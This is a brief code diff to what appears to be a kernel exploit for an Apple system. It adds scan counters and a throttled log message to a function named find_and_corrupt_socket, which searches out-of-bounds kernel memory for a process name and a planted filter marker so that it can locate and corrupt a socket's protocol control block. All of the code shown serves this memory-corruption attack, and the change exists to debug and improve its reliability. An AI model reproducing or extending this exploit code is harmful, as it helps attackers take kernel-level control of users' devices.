@@ -123,6 +123,13 @@ void sockets_release(void) {
     g_ctx.socket_ports_count = 0;
 }
 
+// V25.1: throttled scan verdict — how many oob windows scanned without a
+// single name+filter pair (plus the marker/tag echo counters), so a 0-capture
+// run says WHY instead of staying silent.
+static uint64_t fcs_windows_scanned = 0;
+static uint64_t fcs_name_hits = 0;
+static uint64_t fcs_filter_hits = 0;
+
 kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT],
                                       size_t* target_inp_gencnt_count, bool do_read) {
     if (do_read) {
@@ -144,9 +151,11 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
         // assume inpcb base was that, that's not true for < 17?
         found = memmem(read_buffer + search_start_idx, g_ctx.oob_size - search_start_idx, g_ctx.executable_name, strlen(g_ctx.executable_name));
         if (found != NULL) {
+            fcs_name_hits++;
             uint64_t found_offset = (uint8_t*)found - read_buffer;
             void* filter_found = reverse_memmem(found, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
             if (filter_found != NULL) {
+                fcs_filter_hits++;
                 uint64_t filter_offset = (uint8_t*)filter_found - read_buffer;
                 if (filter_offset >= offsets.inpcb_icmp6filt + 0x8) {
                     pcb_start_offset = filter_offset - (offsets.inpcb_icmp6filt + 0x8);
@@ -159,6 +168,11 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     } while (found != NULL && search_start_idx < g_ctx.oob_size);
 
     if (!target_found) {
+        fcs_windows_scanned++;
+        if ((fcs_windows_scanned & 0x7F) == 0) {
+            LOG("pcb scan: %llu windows, name_hits=%llu filter_hits=%llu — no pair",
+                fcs_windows_scanned, fcs_name_hits, fcs_filter_hits);
+        }
         return KERN_FAILURE;
     }
 
